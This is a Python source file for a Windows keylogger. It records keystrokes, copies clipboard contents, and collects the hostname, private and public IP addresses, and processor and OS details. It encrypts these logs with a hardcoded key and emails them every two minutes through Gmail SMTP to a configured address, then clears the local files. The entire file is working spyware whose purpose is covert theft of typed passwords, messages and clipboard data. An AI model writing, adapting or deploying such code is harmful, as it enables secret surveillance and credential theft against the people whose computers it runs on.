#email features library
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders 
import smtplib

#Collect info
import socket
import platform

#clipboard
import win32clipboard

#multiple
import time
from pynput.keyboard import Key, Listener
import time
import os
from requests import get

#to encrypt
from cryptography.fernet import Fernet


#log file name
keys_info = "key_log.txt"
system_info ="system_info.txt"
clipboard_info ="clipboard.txt"

keys_info_e = "e_key_log.txt"
system_info_e ="e_system_info.txt"
clipboard_info_e ="e_clipboard.txt"

time_iteration = 120


#Email details
email_address = "  " #Enter a Mail Address for Keylogger
password = "  " #Enter Keylogger-Mail Password for Low Level Login
toaddr = "  "  #Enter Admin Mail Address
en_key = "9g6jNwikn0mUo16UTu3_YmylqpUz-yg766znAs416GQ=" #Encryption Key


#log file path
file_path = ".//res"
extend = "//"
file_merge = file_path + extend

 
def send_email(filename,attachment,toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] =  "Log File"
    body = "It is Auto Generated Message -- by LOGe \n " 
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment= open(attachment,'rb')

    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment; filename= %s"% filename)
    msg.attach(p)
    
    #Smtpsession
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def computer_information():
    with open(file_path+extend+system_info,"a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: " + public_ip+'\n')
        except Exception:
            f.write("Couldn't get public ip address")
        
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System :"+ platform.system()+""+platform.version() + '\n')
        f.write("Machine: "+platform.machine()+'\n')
        f.write("Hostname: "+ hostname +'\n')
        f.write("Private IP address :"+IPAddr +'\n')
        
def copy_clipboard():
    with open(file_path+extend+clipboard_info,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n"+pasted_data)
        except:
            f.write("Clipboard could not be copied")

#Main Program
stopping_time = time.time() + time_iteration

while(1):
    count = 0
    keys = []

    def on_press(key):
        global keys, count ,current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()
        
        
        if count >= 1:
            count = 0
            write_file(keys)
            keys=[] 

    def write_file(keys):
        with open(file_path + extend + keys_info,"a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key): 
        if key == Key.esc:
            return False
        if current_time>stopping_time:
            return False
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time>stopping_time:
        computer_information()
        copy_clipboard()

        files_to_encrypt = [file_merge+system_info,file_merge+ clipboard_info,file_merge+keys_info]
        encrypted_file_names = [file_merge+system_info_e,file_merge+ clipboard_info_e,file_merge+keys_info_e]

        count = 0
        for encrypting_file in files_to_encrypt:
            with open(files_to_encrypt[count],'rb') as f:
                data = f.read()
            
            fernet = Fernet (en_key)
            encrypted = fernet.encrypt(data)

            with open(encrypted_file_names[count],'wb') as f:
                f.write(encrypted) 
            
            send_email(encrypted_file_names[count],encrypted_file_names[count],toaddr)
            count +=1 

        with open(file_path+extend+keys_info,'w') as f:
            f.write("")
        with open(file_path+extend+system_info,'w') as f:
            f.write("")
        with open(file_path+extend+clipboard_info,'w') as f:
            f.write("")
    
        current_time = time.time()
        stopping_time = time.time() + time_iteration




















